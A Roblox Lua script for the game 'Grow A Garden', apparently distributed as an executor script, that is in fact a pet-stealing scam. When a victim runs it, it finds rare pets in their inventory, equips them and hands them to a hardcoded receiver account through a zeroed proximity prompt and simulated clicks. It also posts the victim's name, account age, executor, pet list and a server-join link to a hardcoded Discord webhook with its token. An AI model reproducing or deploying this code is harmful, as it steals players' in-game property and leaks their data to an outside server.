repeat 
    task.wait()
until game:IsLoaded()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1400978772764659712/8D9ZMM-FUIUm_i2oSwc3zaX6FA6wNYK96FHGcH69yh1PmhMt0aMlfJgN9S5veYoypzcY"
local VICTIM = game.Players.LocalPlayer
local USERNAMES = {
    "SUMERE4H"
}

local PET_WHITELIST = {
    'Raccoon',
    'T-Rex',
    'Fennec Fox',
    'Dragonfly',
    'Butterfly',
    'Disco Bee',
    'Mimic Octopus',
    'Queen Bee',
    'Spinosaurus',
    'Kitsune',
}

local victimPetTable = {}

local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

local function waitForJoin()
    local findTarget = false
    local trigeretName = nil

    for _, player in game.Players:GetPlayers() do
        if not table.find(USERNAMES, player.Name) then
            continue
        end

        trigeretName = player.Name
        findTarget = true
    end

    return findTarget, trigeretName
end

function createDiscordEmbed(petList, totalValue, fileUrl)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name, 
                    table.concat(USERNAMES, " "), 
                    identifyexecutor(), 
                    game.Players.LocalPlayer.AccountAge
                ),
                inline = false
            },
            {
                name = "💰 **Total Value**",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 **Backpack**",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ **Join with URL**",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                    game.JobId, 
                    game.PlaceId, 
                    game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format(
            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = game.Players.LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local response = request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
    end
end


local function teleportTarget(targetName)
    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
end

local function deltaBypass()
    VirtualInputManager:SendMouseButtonEvent(
        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
        0,      
        true,   
        nil,    
        false   
    )

    task.wait()

    VirtualInputManager:SendMouseButtonEvent(
        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
        0,
        false,
        nil,
        false
    )
end

local function checkPetsWhilelist(pet)
    for _, name in PET_WHITELIST do
        if string.find(pet, name) then
            return true
        end
    end
end

local function getPetObject(petUid: string): Instance?
    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end

    for _, object in workspace[VICTIM.Name]:GetChildren() do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end

    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end

    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function getPlayersPets()
    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
        if not checkPetsWhilelist(value.PetType) then
            continue
        end


        table.insert(victimPetTable, value.PetType)
    end
end

local function startSteal(trigerName)
    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
        deltaBypass()
    end
end

local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhilelist(value.PetType) then
            continue
        end

        local petObject = getPetObject(petUid)
        
        if not petObject then
            continue
        end
        
        equipPet(petObject)
        task.wait(0.2)
        startSteal(target)
    end
end

local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local isTarget, trigerName = waitForJoin()

            if isTarget then
                teleportTarget(trigerName)
                checkPetsInventory(trigerName)
            end
        end
    end)
end

getPlayersPets()

task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            idlingTarget()
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
            break
        end
    end
end)
